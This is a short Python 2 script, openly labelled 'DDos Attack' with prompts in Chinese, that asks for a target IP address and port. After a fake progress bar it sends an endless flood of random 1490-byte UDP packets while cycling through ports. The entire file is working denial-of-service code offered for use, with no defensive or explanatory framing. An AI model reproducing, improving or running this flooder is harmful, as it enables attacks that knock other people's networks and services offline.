import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print " ____  _____                     _   _   _             _           "
print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __           "
print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /        "
print "| |_| | |_|  | (_) \__ \      / ___ \ |_| || (_| | (__|   <      "
print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\                       "



print
ip = raw_input("IP 地址 : ")
port = input("攻击端口   : ")

os.system("clear")
os.system("攻击即将启动")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "发 %s 包到 %s 通过端口 :%s"%(sent,ip,port)
     if port == 65534:
       port = 1

